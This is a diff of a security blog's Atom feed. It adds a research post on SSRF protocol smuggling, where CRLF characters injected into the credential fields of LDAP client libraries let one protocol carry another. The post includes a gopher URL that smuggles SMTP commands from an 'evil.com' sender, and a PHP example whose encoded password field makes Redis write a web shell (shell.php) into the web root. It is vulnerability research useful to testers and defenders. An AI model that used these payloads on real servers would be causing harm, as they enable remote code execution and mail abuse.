@@ -4,7 +4,7 @@
   <title><![CDATA[Silent Robot Systems]]></title>
   <link href="https://www.silentrobots.com/atom.xml" rel="self"/>
   <link href="https://www.silentrobots.com/"/>
-  <updated>2018-05-24T17:19:52-04:00</updated>
+  <updated>2019-02-07T07:29:33-05:00</updated>
   <id>https://www.silentrobots.com/</id>
   <author>
     <name><![CDATA[Willis Vandevanter]]></name>
@@ -12,6 +12,170 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[SSRF Protocol Smuggling in Plaintext Credential Handlers : LDAP]]></title>
+    <link href="https://www.silentrobots.com/blog/2019/02/06/ssrf-protocol-smuggling-in-plaintext-credential-handlers-ldap/"/>
+    <updated>2019-02-06T12:58:21-05:00</updated>
+    <id>https://www.silentrobots.com/blog/2019/02/06/ssrf-protocol-smuggling-in-plaintext-credential-handlers-ldap</id>
+    <content type="html"><![CDATA[<p>SSRF protocol smuggling involves an attacker injecting one TCP protocol into a dissimilar TCP protocol. A classic example is using gopher (i.e. the first protocol) to smuggle SMTP (i.e. the second protocol):</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="ss">gopher</span><span class="p">:</span><span class="sr">//</span><span class="mi">127</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">1</span><span class="p">:</span><span class="mi">25</span><span class="o">/%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="no">AHELO</span><span class="o">%</span><span class="mi">20</span><span class="n">localhost</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="no">AMAIL</span><span class="o">%</span><span class="mi">20</span><span class="no">FROM</span><span class="o">%</span><span class="mi">3</span><span class="no">Abadguy</span><span class="vi">@evil</span><span class="o">.</span><span class="n">com</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="no">ARCPT</span><span class="o">%</span><span class="mi">20</span><span class="no">TO</span><span class="o">%</span><span class="mi">3</span><span class="no">Avictim</span><span class="vi">@site</span><span class="o">.</span><span class="n">com</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="no">ADATA</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span> <span class="o">.</span><span class="n">.</span><span class="o">.</span><span class="n">.</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The keypoint above is the use of the CRLF character (i.e. %0D%0A) which breaks up the commands of the second protocol. <em>This attack is only possible with the ability to inject CRLF characters into a protocol</em>.</p>
+
+<p>Almost all LDAP client libraries support plaintext authentication or a non-ssl simple bind. For example, the following is an LDAP authentication example using Python 2.7 and the python-ldap library:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">ldap</span>
+</span><span class='line'><span class="n">conn</span> <span class="o">=</span> <span class="n">ldap</span><span class="o">.</span><span class="n">initialize</span><span class="p">(</span><span class="s">&quot;ldap://[SERVER]:[PORT]&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">conn</span><span class="o">.</span><span class="n">simple_bind_s</span><span class="p">(</span><span class="s">&quot;[USERNAME]&quot;</span><span class="p">,</span> <span class="s">&quot;[PASSWORD]&quot;</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<!-- more -->
+
+
+<p>In many LDAP client libraries it is possible to insert a CRLF inside the username or password field. Because LDAP is a rather plain TCP protocol this makes it immediately of note.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">ldap</span>
+</span><span class='line'><span class="n">conn</span> <span class="o">=</span> <span class="n">ldap</span><span class="o">.</span><span class="n">initialize</span><span class="p">(</span><span class="s">&quot;ldap://0:9000&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">conn</span><span class="o">.</span><span class="n">simple_bind_s</span><span class="p">(</span><span class="s">&quot;1</span><span class="se">\n</span><span class="s">2</span><span class="se">\n\3\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="s">&quot;4</span><span class="se">\n</span><span class="s">5</span><span class="se">\n</span><span class="s">6---&quot;</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>You can see the CRLF characters are sent in the request:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># nc -lvp 9000</span>
+</span><span class='line'><span class="n">listening</span> <span class="n">on</span> <span class="p">[::]:</span><span class="mi">9000</span> <span class="o">...</span>
+</span><span class='line'><span class="n">connect</span> <span class="n">to</span> <span class="p">[::</span><span class="n">ffff</span><span class="p">:</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">]:</span><span class="mi">9000</span> <span class="kn">from</span> <span class="nn">localhost</span><span class="p">:</span><span class="mi">39250</span> <span class="p">([::</span><span class="n">ffff</span><span class="p">:</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">]:</span><span class="mi">39250</span><span class="p">)</span>
+</span><span class='line'><span class="mi">0</span><span class="err">`</span><span class="mi">1</span>
+</span><span class='line'><span class="mi">2</span>
+</span><span class='line'><span class="mi">3</span>
+</span><span class='line'><span class="mi">4</span>
+</span><span class='line'><span class="mi">5</span>
+</span><span class='line'><span class="mi">6</span><span class="o">---</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h1>Real World Example</h1>
+
+<p>Imagine the case where the user can control the server and the port. This is very common in LDAP configuration settings. For example, there are many web applications that support LDAP configuration as a feature. Some common examples are embedded devices (e.g. webcam, routers), Multi-Function Printers, multi-tenancy environments, and enterprise appliances and applications.</p>
+
+<p><img class="center" src="https://www.silentrobots.com/images/LDAP_Printer_Injection.png" width="750" height="450"></p>
+
+<h1>Putting It All Together</h1>
+
+<p><u>If a user can control the server/port and CRLF can be injected into the username or password</u>, this becomes an interesting SSRF protocol smuggle. For example, here is a Redis Remote Code Execution payload smuggled completely inside the password field of the LDAP authentication in a PHP application. In this case the web root is &lsquo;/app&rsquo; and the Redis server would need to be able to write the web root:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'>    <span class="nv">$adServer</span> <span class="o">=</span> <span class="s2">&quot;ldap://127.0.0.1:6379&quot;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="nv">$ldap</span> <span class="o">=</span> <span class="nb">ldap_connect</span><span class="p">(</span><span class="nv">$adServer</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c1"># RCE smuggled in the password field</span>
+</span><span class='line'>    <span class="nv">$password</span> <span class="o">=</span> <span class="s2">&quot;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%244%0D%0A/app%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A&quot;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="nv">$ldaprdn</span> <span class="o">=</span> <span class="s1">&#39;domain&#39;</span> <span class="o">.</span> <span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span> <span class="o">.</span> <span class="s2">&quot;1</span><span class="se">\n</span><span class="s2">2</span><span class="se">\n</span><span class="s2">3</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="nb">ldap_set_option</span><span class="p">(</span><span class="nv">$ldap</span><span class="p">,</span> <span class="nx">LDAP_OPT_PROTOCOL_VERSION</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span>
+</span><span class='line'>    <span class="nb">ldap_set_option</span><span class="p">(</span><span class="nv">$ldap</span><span class="p">,</span> <span class="nx">LDAP_OPT_REFERRALS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="nv">$bind</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ldap_bind</span><span class="p">(</span><span class="nv">$ldap</span><span class="p">,</span> <span class="nv">$ldaprdn</span><span class="p">,</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$password</span><span class="p">));</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h1>Client Libraries</h1>
+
+<p>In my opinion, the client library is functioning correctly by allowing these characters. Rather, it&rsquo;s the application&rsquo;s job to filter username and password input before passing it to an LDAP client library. I tested out four LDAP libraries that are packaged with common languages all of which allow CRLF in the username or password field:</p>
+
+<table>
+<thead>
+<tr>
+<th><u>Library</u></th>
+<th><u>Tested In</u></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td> python-ldap </td>
+<td> Python 2.7</td>
+</tr>
+<tr>
+<td> com.sun.jndi.ldap </td>
+<td> JDK 11 </td>
+</tr>
+<tr>
+<td> php-ldap </td>
+<td> PHP 7 </td>
+</tr>
+<tr>
+<td> net-ldap </td>
+<td> Ruby 2.5.2 </td>
+</tr>
+<tr>
+<td>&mdash;&mdash;-</td>
+<td>&mdash;&mdash;&ndash;</td>
+</tr>
+</tbody>
+</table>
+
+
+<p><br></p>
+
+<h1>Summary Points</h1>
+
+<ul>
+<li><p>• If you are an attacker and find an LDAP configuration page, check if the username or password field allows CRLF characters. Typically the initial test will involve sending the request to a listener that you control to verify these characters are not filtered.</p></li>
+<li><p>• If you are defender, make sure your application is filtering CRLF characters (i.e. %0D%0A)
+<br><br></p></li>
+</ul>
+
+
+<h1>Blackhat USA 2019</h1>
+
+<p><a href="https://twitter.com/AndresRiancho">@AndresRiancho</a> and I (<a href="https://twitter.com/0xRST">@0xrst</a>) have an outstanding training coming up at Blackhat USA 2019. There are two dates available and you should join us!!! It is going to be fun.</p>
+
+<h1><u><a href="https://www.blackhat.com/us-19/training/schedule/index.html#the-web-application-hacker-level-up-lab-the-wahll-14026">August 3rd-4th: THE WEB APPLICATION HACKER LEVEL-UP LAB (THE WAHLL)</a></u></h1>
+
+<h1><u><a href="https://www.blackhat.com/us-19/training/schedule/index.html#the-web-application-hacker-level-up-lab-the-wahll-140261547499375">August 5th-6th: THE WEB APPLICATION HACKER LEVEL-UP LAB (THE WAHLL)</a></u></h1>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[odle: piping security data]]></title>
@@ -62,7 +226,7 @@
 
 <h1>Install</h1>
 
-<p>To install aquatone you will need ruby and nokogiri:</p>
+<p>To install odle you will need ruby and nokogiri:</p>
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -73,6 +237,14 @@
 <h1>Bugs</h1>
 
 <p>I am sure there are plenty. Please submit an issue if you find one or if you would like to see other supported tools. I am also interested in inconsistencies between outputs, missing data, and other issues if you see them.</p>
+
+<h1>Blackhat USA 2019</h1>
+
+<p><a href="https://twitter.com/AndresRiancho">@AndresRiancho</a> and I (<a href="https://twitter.com/0xRST">@0xrst</a>) have an outstanding training coming up at Blackhat USA 2019. There are two dates available and you should join us!!! You won&rsquo;t be disappointed.</p>
+
+<h1><u><a href="https://www.blackhat.com/us-19/training/schedule/index.html#the-web-application-hacker-level-up-lab-the-wahll-14026">August 3rd-4th: THE WEB APPLICATION HACKER LEVEL-UP LAB (THE WAHLL)</a></u></h1>
+
+<h1><u><a href="https://www.blackhat.com/us-19/training/schedule/index.html#the-web-application-hacker-level-up-lab-the-wahll-140261547499375">August 5th-6th: THE WEB APPLICATION HACKER LEVEL-UP LAB (THE WAHLL)</a></u></h1>
 ]]></content>
   </entry>
   
@@ -235,6 +407,14 @@
 <p>The youtube video is up: <a href="https://www.youtube.com/watch?v=ouBwRZJHmmo">https://www.youtube.com/watch?v=ouBwRZJHmmo</a></p>
 
 <p>I also gave an updated version of the presentation in November for the Blackhat Webcast Series. It included more file types; PDF, JPG, and GIF. The link is here: <a href="https://www.blackhat.com/html/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.html">https://www.blackhat.com/html/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.html</a></p>
+
+<h1>Blackhat USA 2019</h1>
+
+<p><a href="https://twitter.com/AndresRiancho">@AndresRiancho</a> and I (<a href="https://twitter.com/0xRST">@0xrst</a>) have an outstanding training coming up at Blackhat USA 2019. There are two dates available and you should join us!!! You won&rsquo;t be disappointed.</p>
+
+<h1><u><a href="https://www.blackhat.com/us-19/training/schedule/index.html#the-web-application-hacker-level-up-lab-the-wahll-14026">August 3rd-4th: THE WEB APPLICATION HACKER LEVEL-UP LAB (THE WAHLL)</a></u></h1>
+
+<h1><u><a href="https://www.blackhat.com/us-19/training/schedule/index.html#the-web-application-hacker-level-up-lab-the-wahll-140261547499375">August 5th-6th: THE WEB APPLICATION HACKER LEVEL-UP LAB (THE WAHLL)</a></u></h1>
 ]]></content>
   </entry>
   
